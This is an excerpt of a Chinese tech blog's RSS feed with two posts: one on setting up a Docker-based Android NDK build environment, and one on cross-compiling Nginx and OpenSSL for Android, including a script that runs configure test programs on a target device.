<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>技术 - 看看俺 – KanKanAn.com</title>
        <link>http://blog.kankanan.com/category/tech.xml</link>
        <description>记我所思，忆我所为。</description>
        <lastBuildDate>Thu, 23 Aug 2018 13:25:14 GMT</lastBuildDate>
        <docs>http://blogs.law.harvard.edu/tech/rss</docs>
        <generator>Feed for Node.js</generator>
        <image>
            <title>技术 - 看看俺 – KanKanAn.com</title>
            <url>http://blog.kankanan.com/static/favicon.ico</url>
            <link>http://blog.kankanan.com/category/tech.xml</link>
        </image>
        <copyright>版权所有 © 2011-2015 看看俺 – KanKanAn.com</copyright>
        <category>技术</category>
        <item>
            <title><![CDATA[使用 docker 创建 NDK 开发环境]]></title>
            <link>/article/4f7f7528-docker-521b5efa-ndk-5f0053d173af5883.html</link>
            <guid>/article/4f7f7528-docker-521b5efa-ndk-5f0053d173af5883.html</guid>
            <pubDate>Tue, 14 Aug 2018 10:03:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
编写 Dockerfile
</p>

<div class="org-src-container">
<pre class="src src-dockerfile"><span style="color: #b5bd68;">FROM</span> <span style="color: #81a2be; font-weight: bold;">ubuntu:18.04</span>

<span style="color: #b5bd68;">RUN</span> sed -i <span style="color: #8abeb7;">'s/http:\/\/archive\.ubuntu\.com\/ubuntu\//http:\/\/mirrors\.163\.com</span><span style="color: #8abeb7; text-decoration: underline;">\/ubuntu\//g'</span><span style="text-decoration: underline;"> /etc/apt/sources.list</span>
<span style="color: #b5bd68;">RUN</span> apt-get -y update
<span style="color: #b5bd68;">RUN</span> apt-get install -y make wget cmake git autoconf automake libtool file
<span style="color: #b5bd68;">RUN</span> <span style="color: #f0c674;">DEBIAN_FRONTEND</span>=noninteractive apt-get install -y tzdata
<span style="color: #b5bd68;">RUN</span> mkdir /build &amp;&amp; <span style="color: #8abeb7;">\</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; <span style="color: #8abeb7;">\</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"Asia/Shanghai"</span> &gt; /etc/timezone
<span style="color: #b5bd68;">RUN</span> apt-get install -y android-tools-adb
<span style="color: #b5bd68;">RUN</span> apt-get install -y unzip
<span style="color: #b5bd68;">RUN</span> echo no | dpkg-reconfigure dash
<span style="color: #b5bd68;">RUN</span> wget -c https://dl.google.com/android/repository/android-ndk-r17-beta2-linux<span style="text-decoration: underline;">-x86_64.zip?</span><span style="color: #f0c674; text-decoration: underline;">hl</span><span style="text-decoration: underline;">=zh-cn -O /build/android-ndk-r17-beta2-linux-x86_64.zip</span>
<span style="color: #b5bd68;">RUN</span> unzip /build/android-ndk-r17-beta2-linux-x86_64.zip -d /opt/
<span style="color: #b5bd68;">RUN</span> rm /build/android-ndk-r17-beta2-linux-x86_64.zip
<span style="color: #b5bd68;">RUN</span> apt-get install -y python
<span style="color: #b5bd68;">RUN</span> /opt/android-ndk-r17-beta2/build/tools/make_standalone_toolchain.py --arch a<span style="text-decoration: underline;">rm64 --api 24 --</span><span style="color: #f0c674; text-decoration: underline;">stl</span><span style="text-decoration: underline;">=libc++ --install-dir /opt/android-toolchain</span>
<span style="color: #b5bd68;">RUN</span> echo $<span style="color: #8abeb7;">'export PATH=/opt/android-toolchain/bin:$PATH\n\</span>
<span style="color: #8abeb7;">export CC=aarch64-linux-android-clang\n\</span>
<span style="color: #8abeb7;">export CXX=aarch64-linux-android-clang++\n\</span>
<span style="color: #8abeb7;">export LD=aarch64-linux-android-ld\n\</span>
<span style="color: #8abeb7;">export AR=aarch64-linux-android-ar\n\</span>
<span style="color: #8abeb7;">export STRIP=aarch64-linux-android-strip\n\</span>
<span style="color: #8abeb7;">export RANLIB=aarch64-linux-android-ranlib\n\</span>
<span style="color: #8abeb7;">export AS=aarch64-linux-android-clang\n\</span>
<span style="color: #8abeb7;">export CFLAGS="-fPIE"\n\</span>
<span style="color: #8abeb7;">export CXXFLAGS="$CFLAGS"\n\</span>
<span style="color: #8abeb7;">export LDFLAGS="-fPIE -pie"\n\</span>
<span style="color: #8abeb7;">export SYSROOT=/opt/android-toolchain/sysroot\n\</span>
<span style="color: #8abeb7;">export CROSS_COMPILE_HOST=aarch64-linux-android'</span> &gt; /root/.ndkrc

<span style="color: #b5bd68;">WORKDIR</span> /build

<span style="color: #b5bd68;">ENTRYPOINT</span> [<span style="color: #8abeb7;">"/bin/bash"</span>]
</pre>
</div></li>

<li><p>
构建 docker 镜像
</p>

<div class="org-src-container">
<pre class="src src-sh">docker build -f Dockerfile --network=host -t ndk:r17-beta2 .
</pre>
</div></li>

<li><p>
运行 docker 容器
</p>

<div class="org-src-container">
<pre class="src src-sh">docker run --rm --network=host -v ${<span style="color: #f0c674;">HOME</span>}/.android:/root/.android -it ndk:r17-be<span style="text-decoration: underline;">ta2</span>
</pre>
</div>

<p>
下面的命令全部在 docker 容器中执行。
</p></li>

<li><p>
交叉编译程序
</p>

<div class="org-src-container">
<pre class="src src-sh">cat &gt; hello.c &lt;&lt;EOF
<span style="color: #8abeb7;">#include &lt;stdio.h&gt;</span>
<span style="color: #8abeb7;">int main() {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #8abeb7;">   printf("hello ndk\n");</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #8abeb7;">   return 0;</span>
<span style="color: #8abeb7;">}</span>
<span style="color: #8abeb7;">EOF</span>
<span style="color: #b294bb;">.</span> ~/.ndkrc
$<span style="color: #f0c674;">CC</span> $<span style="color: #f0c674;">CFLAGS</span> $<span style="color: #f0c674;">LDFLAGS</span> hello.c -o hello
</pre>
</div></li>

<li><p>
在设备上运行程序
</p>

<p>
假设设备 IP 为 192.168.1.3
</p>

<div class="org-src-container">
<pre class="src src-sh">adb connect 192.168.1.3
adb root
adb connect 192.168.1.3
adb remount
adb connect 192.168.1.3
adb push ./hello /tmp/hello
adb shell /tmp/hello
</pre>
</div>

<p>
最终将输出结果 <code>hello ndk</code> 。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 NDK 移植 Linux C/C++ 程序到 Android 系统]]></title>
            <link>/article/4f7f7528-ndk-79fb690d-linux-c-c-7a0b5e8f5230-android-7cfb7edf.html</link>
            <guid>/article/4f7f7528-ndk-79fb690d-linux-c-c-7a0b5e8f5230-android-7cfb7edf.html</guid>
            <pubDate>Thu, 09 Aug 2018 07:28:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org23ccf60" class="outline-2">
<h2 id="org23ccf60">区分基础概念：JNI 与 NDK</h2>
<div class="outline-text-2" id="text-org23ccf60">
<ul class="org-ul">
<li>JNI（Java Native Interface）是一种 Java 语言特性</li>
</ul>

<p>
用于 Java 程序与 C、C++ 库间的互相调用。
</p>

<ul class="org-ul">
<li>NDK（Native Development Kit）是 Google 提供的使用 C/C++ 编写 Android 程序的开
发工具包</li>
</ul>

<p>
它使用 JNI 实现 Java 程序调用 C/C++ 本地代码，允许 C/C++ 本地代码访问 Android
API，不只是用来开发或移植 C/C++ 库，也可以是 C/C++ 程序。
</p>

<p>
引用自 <a href="https://developer.android.com/ndk/">Android NDK  |  Android NDK  |  Android Developers</a>
</p>
<blockquote>
<p>
Android NDK
</p>

<p>
The Android NDK is a toolset that lets you implement parts of your app in native
code, using languages such as C and C++. For certain types of apps, this can
help you reuse code libraries written in those languages.
</p>
</blockquote>

<p>
NDK 提供一系列稳定的 C/C++ API，头文件在 <code>sysroot/usr/include</code> 下，主要包括 C 标
准库、C++ 标准库、jni、math、pthread、zlib、OpenGL、Android 相关的库，
<a href="https://developer.android.com/ndk/guides/stable_apis">NDK 支持的 API</a> 也会随着需求的增加而日趋完善。
</p>
</div>
</div>


<div id="outline-container-org2d91a23" class="outline-2">
<h2 id="org2d91a23">移植使用 GNU Autotools 的项目</h2>
<div class="outline-text-2" id="text-org2d91a23">
<p>
NDK 提供了创建独立工具链的工具，对于移植使用 GNU Autotools 的项目到 Android 平台
很有帮助，省去写 <code>Android.mk</code> 。
</p>

<ul class="org-ul">
<li><p>
创建独立工具链
</p>

<div class="org-src-container">
<pre class="src src-sh">/opt/android-ndk/build/tools/make_standalone_toolchain.py <span style="color: #8abeb7;">\</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   --arch arm64 --api 28 --stl=libc++ --install-dir /opt/android-toolchain
</pre>
</div></li>

<li><p>
环境变量配置
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:/opt/android-toolchain/bin
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">CC</span>=aarch64-linux-android-clang
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">CXX</span>=aarch64-linux-android-clang++
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">LD</span>=aarch64-linux-android-ld
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">AR</span>=aarch64-linux-android-ar
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">STRIP</span>=aarch64-linux-android-strip
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">RANLIB</span>=aarch64-linux-android-ranlib
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">AS</span>=aarch64-linux-android-clang
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">CFLAGS</span>=<span style="color: #8abeb7;">"-fPIE -fPIC"</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">CXXFLAGS</span>=<span style="color: #8abeb7;">"-fPIE -fPIC"</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">LDFLAGS</span>=<span style="color: #8abeb7;">"-pie"</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">SYSROOT</span>=/opt/android-toolchain/sysroot
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">CROSS_COMPILE_HOST</span>=aarch64-linux-android
</pre>
</div></li>

<li><p>
交叉编译
</p>

<div class="org-src-container">
<pre class="src src-sh">./configure --host=${<span style="color: #f0c674;">CROSS_COMPILE_HOST</span>} --prefix=/opt/local
make
make install
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org5640d20" class="outline-2">
<h2 id="org5640d20">移植 Nginx 遇到的问题</h2>
<div class="outline-text-2" id="text-org5640d20">
<ul class="org-ul">
<li><p>
编译出错 <code>cstddef:43:25: fatal error: stddef.h: No such file or directory</code>
</p>

<p>
看起来是 C++ 编译器找不到 C 头文件，是已知问题，在 Standalone 工具链中使用
<code>gcc</code> 就会出现，见
</p>

<p>
<a href="https://github.com/android-ndk/ndk/issues/215">stddef.h: No such file or directory · Issue #215 · android-ndk/ndk</a>
</p>

<p>
改为使用 <code>clang</code> 就好了，以后的 NDK 将彻底移除对 <code>gcc</code> 的支持。
</p></li>

<li><p>
交叉编译 OpenSSL
</p>

<p>
网上有大量的移植文档，基本上是基于 <a href="https://wiki.openssl.org/index.php/Android">OpenSSL Android - OpenSSLWiki</a> ，最大的问题
是使用的 NDK 和 OpenSSL 版本都比较旧，最后主要参考
</p>

<p>
<a href="https://github.com/couchbaselabs/couchbase-lite-libcrypto">couchbaselabs/couchbase-lite-libcrypto: Pre-built OpenSSL libcrypto static libraries</a>
</p>

<p>
移植成功。OpenSSL 的交叉编译需要完整的 NDK 包，最好新开一个 Shell 来编译
OpenSSL，避免为独立工具链设置的环境变量影响到 OpenSSL 的编译。
</p>

<p>
编译过程中会报错 <code>crtbegin_so.o: No such file: No such file or directory</code> ，将
它从工具链中拷到当前目录即可， <code>crtend_so.o</code> 、 <code>crtbegin_dynamic.o</code> 、
<code>crtend_android.o</code> 也进行相同处理，参考
<a href="https://stackoverflow.com/questions/6881164/crtbegin-so-o-missing-for-android-toolchain-custom-build">gcc - crtbegin_so.o missing for android toolchain (custom build) - Stack Overflow</a>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Download</span>
wget https://codeload.github.com/openssl/openssl/zip/OpenSSL_1_1_0-stable -O ope<span style="text-decoration: underline;">nssl-OpenSSL_1_1_0-stable.zip</span>
unzip openssl-OpenSSL_1_1_0-stable.zip
wget https://raw.githubusercontent.com/couchbaselabs/couchbase-lite-libcrypto/ma<span style="text-decoration: underline;">ster/build-android-setenv.sh -O openssl.setenv</span>
sed -i -e <span style="color: #8abeb7;">'s/^_ANDROID_NDK=/#_ANDROID_NDK=/g'</span> openssl.setenv

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Config</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">ANDROID_NDK_ROOT</span>=/opt/android-ndk
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">_ANDROID_TARGET_SELECT</span>=arch-arm64-v8a
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">_ANDROID_NDK</span>=<span style="color: #8abeb7;">"android-ndk"</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">ANDROID_EABI_PREFIX</span>=aarch64-linux-android
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">_ANDROID_EABI</span>=<span style="color: #8abeb7;">"${ANDROID_EABI_PREFIX}-4.9"</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">_ANDROID_ARCH</span>=arch-arm64
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">_ANDROID_API</span>=<span style="color: #8abeb7;">"android-28"</span>
<span style="color: #b294bb;">source</span> openssl.setenv

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Build</span>
<span style="color: #b294bb;">cd</span> openssl-OpenSSL_1_1_0-stable
./Configure dist
./Configure no-ssl2 no-ssl3 no-comp no-hw no-engine --openssldir=/opt/local/ --p<span style="text-decoration: underline;">refix=/opt/local/ linux-generic64 -DB_ENDIAN -B$</span><span style="color: #f0c674; text-decoration: underline;">ANDROID_DEV</span><span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">\</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   -I${<span style="color: #f0c674;">ANDROID_NDK_ROOT</span>}/sysroot/usr/include -I${<span style="color: #f0c674;">ANDROID_NDK_ROOT</span>}/sysr<span style="text-decoration: underline;">oot/usr/include/${</span><span style="color: #f0c674; text-decoration: underline;">ANDROID_EABI_PREFIX</span><span style="text-decoration: underline;">} </span><span style="color: #8abeb7; text-decoration: underline;">\</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   -fPIE -pie -L${<span style="color: #f0c674;">ANDROID_NDK_ROOT</span>}/platforms/${<span style="color: #f0c674;">_ANDROID_API</span>}/${<span style="color: #f0c674;">_ANDROI</span><span style="color: #f0c674; text-decoration: underline;">D_ARCH</span><span style="text-decoration: underline;">}/usr/lib</span>
ln -s ${<span style="color: #f0c674;">SYSROOT</span>}/usr/lib/crtbegin_so.o
ln -s ${<span style="color: #f0c674;">SYSROOT</span>}/usr/lib/crtend_so.o
ln -s ${<span style="color: #f0c674;">SYSROOT</span>}/usr/lib/crtbegin_dynamic.o
ln -s ${<span style="color: #f0c674;">SYSROOT</span>}/usr/lib/crtend_android.o
make -j6
make install
</pre>
</div></li>

<li><p>
交叉编译出的配置检测程序无法直接运行
</p>

<p>
Nginx 没有使用 GNU Autotools，而是有自已的 Configure 脚本，遇到的第一个问题就
是 Nginx 是通过使用编译器编译一个测试程序来获取配置信息，交叉编译出来的程序肯
定是无法在编译机上运行的，一个可靠的办法就是修改 Configure 脚本，改为上传到目
标设备上执行。
</p>

<p>
下面是我写好的一个远程执行脚本 <code>execute</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">#</span> != 2 ] || ([ $<span style="color: #f0c674;">1</span> != <span style="color: #8abeb7;">"-c"</span> ] &amp;&amp; [ $<span style="color: #f0c674;">1</span> != <span style="color: #8abeb7;">"-f"</span> ]) ; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"usage: $0 -&lt;c|f&gt; &lt;cmd|file&gt;"</span> &gt;&gt; /dev/stderr
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">exit</span> 22 <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">Invalid argument</span>
<span style="color: #b5bd68;">fi</span>

<span style="color: #f0c674;">LOG_FILE</span>=/dev/null

<span style="color: #b5bd68;">if</span> [[ <span style="color: #8abeb7;">"$CROSS_COMPILE_HOST"</span> = *<span style="color: #8abeb7;">"android"</span>* ]]; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb connect ${<span style="color: #f0c674;">CROSS_COMPILE_DEVICE_IP</span>} &gt;&gt;$<span style="color: #f0c674;">LOG_FILE</span> 2&gt;&amp;1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb wait-for-device
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb root &gt;&gt;$<span style="color: #f0c674;">LOG_FILE</span> 2&gt;&amp;1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb connect ${<span style="color: #f0c674;">CROSS_COMPILE_DEVICE_IP</span>} &gt;&gt;$<span style="color: #f0c674;">LOG_FILE</span> 2&gt;&amp;1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb wait-for-device
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb remount &gt;&gt;$<span style="color: #f0c674;">LOG_FILE</span> 2&gt;&amp;1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb connect ${<span style="color: #f0c674;">CROSS_COMPILE_DEVICE_IP</span>} &gt;&gt;$<span style="color: #f0c674;">LOG_FILE</span> 2&gt;&amp;1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb wait-for-device
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">1</span> == <span style="color: #8abeb7;">"-f"</span> ]; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">tempfile</span>=<span style="color: #b294bb;">`mktemp -u XXXXXXXX`</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">tempdir</span>=/tmp/cross-compile
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb shell mkdir ${<span style="color: #f0c674;">tempdir</span>} &gt;&gt;$<span style="color: #f0c674;">LOG_FILE</span> 2&gt;&amp;1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb push $<span style="color: #f0c674;">2</span> ${<span style="color: #f0c674;">tempdir</span>}/${<span style="color: #f0c674;">tempfile</span>} &gt;&gt;$<span style="color: #f0c674;">LOG_FILE</span> 2&gt;&amp;1
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb shell <span style="color: #8abeb7;">"find ${tempdir} -ctime +1 -type f -exec rm {} \; &gt;/dev/null 2</span><span style="color: #8abeb7; text-decoration: underline;">&gt;&amp;1; cd ${tempdir} &amp;&amp; chmod a+x $tempfile &amp;&amp; ./$tempfile"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">else</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   adb shell $<span style="color: #f0c674;">2</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">fi</span>
<span style="color: #b5bd68;">else</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">1</span> == <span style="color: #8abeb7;">"-f"</span> ]; <span style="color: #b5bd68;">then</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">tempfile</span>=<span style="color: #b294bb;">`mktemp -u XXXXXXXX`</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">tempdir</span>=/tmp/cross-compile
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ssh -o <span style="color: #f0c674;">StrictHostKeyChecking</span>=no root@${<span style="color: #f0c674;">CROSS_COMPILE_DEVICE_IP</span>} mkdir ${<span style="color: #f0c674; text-decoration: underline;">tempdir</span><span style="text-decoration: underline;">} &gt;&gt;$</span><span style="color: #f0c674; text-decoration: underline;">LOG_FILE</span><span style="text-decoration: underline;"> 2&gt;&amp;1</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   scp -o <span style="color: #f0c674;">StrictHostKeyChecking</span>=no $<span style="color: #f0c674;">2</span> root@${<span style="color: #f0c674;">CROSS_COMPILE_DEVICE_IP</span>}:${<span style="color: #f0c674;">tem</span><span style="color: #f0c674; text-decoration: underline;">pdir</span><span style="text-decoration: underline;">}/${</span><span style="color: #f0c674; text-decoration: underline;">tempfile</span><span style="text-decoration: underline;">} &gt;&gt;$</span><span style="color: #f0c674; text-decoration: underline;">LOG_FILE</span><span style="text-decoration: underline;"> 2&gt;&amp;1</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ssh -o <span style="color: #f0c674;">StrictHostKeyChecking</span>=no root@${<span style="color: #f0c674;">CROSS_COMPILE_DEVICE_IP</span>} <span style="color: #8abeb7;">"find ${</span><span style="color: #8abeb7; text-decoration: underline;">tempdir} -mmin +1 -type f -exec rm {} \; &gt;/dev/null 2&gt;&amp;1; cd ${tempdir} &amp;&amp; chmod a+x $tempfile &amp;&amp; ./$tempfile"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">else</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   ssh -o <span style="color: #f0c674;">StrictHostKeyChecking</span>=no root@${<span style="color: #f0c674;">CROSS_COMPILE_DEVICE_IP</span>} $<span style="color: #f0c674;">2</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">fi</span>
<span style="color: #b5bd68;">fi</span>
</pre>
</div>

<p>
修改 <code>nginx-1.14.0</code> 的配置脚本，将本地运行测试程序的地方改为远程执行
</p>
<div class="org-src-container">
<pre class="src src-sh">sed -i -e <span style="color: #8abeb7;">'s/\/bin\/sh -c $NGX_AUTOTEST/timeout 10 \/build\/execute -f $NGX_AUTO</span><span style="color: #8abeb7; text-decoration: underline;">TEST/g'</span><span style="text-decoration: underline;"> </span><span style="color: #b294bb; text-decoration: underline;">`find auto -type f`</span>
sed -i -e <span style="color: #8abeb7;">'s/$NGX_AUTOTEST &gt;\/dev\/null/timeout 10 \/build\/execute -f $NGX_AUTO</span><span style="color: #8abeb7; text-decoration: underline;">TEST &gt;\/dev\/null/g'</span><span style="text-decoration: underline;"> </span><span style="color: #b294bb; text-decoration: underline;">`find auto -type f`</span>
sed -i -e <span style="color: #8abeb7;">'s/`$NGX_AUTOTEST`/`timeout 10 \/build\/execute -f $NGX_AUTOTEST`/g'</span> <span style="color: #b294bb;">`</span><span style="color: #b294bb; text-decoration: underline;">find auto -type f`</span>
</pre>
</div>

<p>
运行时需要预先设置环境变量 <code>CROSS_COMPILE_DEVICE_IP</code> 为目标设备 IP，对于嵌入式
Linux 设备，需要使用 <code>ssh-copy-id</code> 命令设置为本机免密码 ssh 登录，对于 Android
设备需要预先 adb 授权通过。
</p></li>

<li><p>
编译时找不到 <code>crypt.h</code>
</p>

<p>
<code>crypt.h</code> 属于 <code>glibc</code> ， <code>glibc</code> 是 Linux 下的 C 标准库实现，除了实现 <code>ANSI
  C</code> 标准库还有大量方便 Linux 开发的扩展功能。而 NDK 提供的 C 标准库并非 <code>glibc</code>
而是 <a href="https://github.com/android/platform_bionic/">Bionic libc</a> ，这导致移植 Nginx 时由于缺少 <code>crypt.h</code> 头文件而编译不过。
</p>

<p>
可以将 <code>crypt</code> 调用替换为 <code>DES_crypt</code>
</p>
<div class="org-src-container">
<pre class="src src-sh">sed -i -e <span style="color: #8abeb7;">'s/#include &lt;crypt.h&gt;/#if (NGX_HAVE_CRYPT_H)\n#include &lt;crypt.h&gt;\n#end</span><span style="color: #8abeb7; text-decoration: underline;">if\n#include &lt;openssl\/des.h&gt;/g'</span><span style="text-decoration: underline;"> src/os/unix/ngx_linux_config.h</span>
sed -i -e <span style="color: #8abeb7;">'s/= crypt(/= DES_crypt(/g'</span> src/os/unix/ngx_user.c
</pre>
</div></li>

<li><p>
链接时找不到 <code>glob</code> 函数
</p>

<p>
NDK 工具链是有提供 <code>glob.h</code> 头文件的，但是链接时却找不到 <code>glob</code> 函数。网络上有
很多单独提供 <a href="https://github.com/tatowilson/Cross-Compile-Nginx-with-RTMP-Module-for-Android/tree/master/glob">glob</a> 下载的，但是都无法直接通过编译，因为里面有很多平台相关的特性。
</p>

<p>
<a href="https://github.com/android-ndk/ndk/issues/718">Undefined reference to glob and globfree in libc.so · Issue #718 · android-ndk/ndk</a>
中说是已经在 <code>r17b</code> 版本解决，需安装 <code>android-ndk-r17-beta2</code> 同时设置 <code>API
  Level</code> 为 <code>28</code> 即可。
</p></li>

<li><p>
交叉编译 Nginx
</p>

<p>
可使用独立工具链来交叉编译 Nginx，参考前面环境变量配置部分先设置好工具链的环境
变量。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #f0c674;">CC_TEST_FLAGS</span>=<span style="color: #8abeb7;">"${CFLAGS} ${LDFLAGS}"</span> ./configure --with-ld-opt=<span style="color: #8abeb7;">"${LDFLAGS}"</span> --pr<span style="text-decoration: underline;">efix=/opt/local --crossbuild=</span><span style="color: #b294bb; text-decoration: underline;">`/build/execute -c 'uname -srm' | tr ' ' ':'`</span><span style="text-decoration: underline;"> --user=root --group=root --with-select_module --with-poll_module --with-file-aio --with-http_ssl_module --without-mail_pop3_module --without-mail_imap_module  --without-mail_smtp_module</span>
make
make install
</pre>
</div></li>

<li><p>
编译出的 Nginx 无法在低版本的 Android 上运行
</p>

<p>
之前为了使用最新的 NDK 工具链包含的函数 <code>glob</code> ，而将 <code>API Level</code> 设置成 <code>28</code>
，这就意味着编译出来的程序无法在低版本的 Android（&lt;=8.1） 上运行，在 Android
7.1 上运行会报错 <code>/system/bin/nginx: No such file or directory</code> 。
</p>

<p>
将 NDK 最新工具链带的 <code>so</code> 也拷到设备上，运行程序前设置一下 <code>$LD_LIBRARY_PATH</code>
优先使用最新的 <code>so</code> ，Nginx 运行后直接卡死或者立即崩溃。
</p>

<p>
添加 <code>-static -Wl,--dynamic-linker=/system/bin/linker</code> 链接选项静态编译，运行
时会报错 <code>/system/bin/nginx: Accessing a corrupted shared library</code> 的错误，需
要使用 <code>/system/bin/linker64</code> 。
</p>

<p>
由于 <code>-static</code> 与 <code>-pie</code> 是互相冲突的选项，静态编译的程序运行时会报错 <code>only
  position independent executables (PIE) are supported.</code> 。
</p></li>

<li><p>
编译在 Android 5 及以上版本运行的 Nginx
</p>

<p>
参考以下项目，通过使用 docker 方便交叉编译 nginx-1.14.0
</p>

<p>
<a href="https://github.com/tangxinfa/android-nginx">tangxinfa/android-nginx: Cross compile nginx with android ndk</a>
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org6a0b0b5" class="outline-2">
<h2 id="org6a0b0b5">结论</h2>
<div class="outline-text-2" id="text-org6a0b0b5">
<p>
一般的 C/C++ 库通常本身就会注重可移植性，不会生硬地依赖系统底层特性，使用 NDK
移植是可行的，即使是 <code>ffmpeg</code> 这种大型的库也可以成功移植到 Android。
</p>

<p>
而对于一些 Linux 下的程序，使用 NDK 直接移植会有很大的失败机率，因为他们可能
使用了 NDK 不支持的特性（如 <code>glibc</code> ）。
</p>

<p>
NDK 一直在改进，以前阻碍我们移植到 Android 的问题很可能会在新版本中解决，遗憾
的是编译出的程序无法运行在旧版本 Android 上。
</p>
</div>
</div>

<div id="outline-container-org3c8205c" class="outline-2">
<h2 id="org3c8205c">参考</h2>
<div class="outline-text-2" id="text-org3c8205c">
<ul class="org-ul">
<li><a href="https://developer.android.com/ndk/guides/concepts">Concepts  |  Android NDK  |  Android Developers</a></li>

<li><a href="http://www.jkeabc.com/475203.html">Android NDK vs AOSP Build System</a></li>

<li><a href="https://developer.android.com/ndk/guides/stable_apis">Android NDK Native APIs  |  Android NDK  |  Android Developers</a></li>

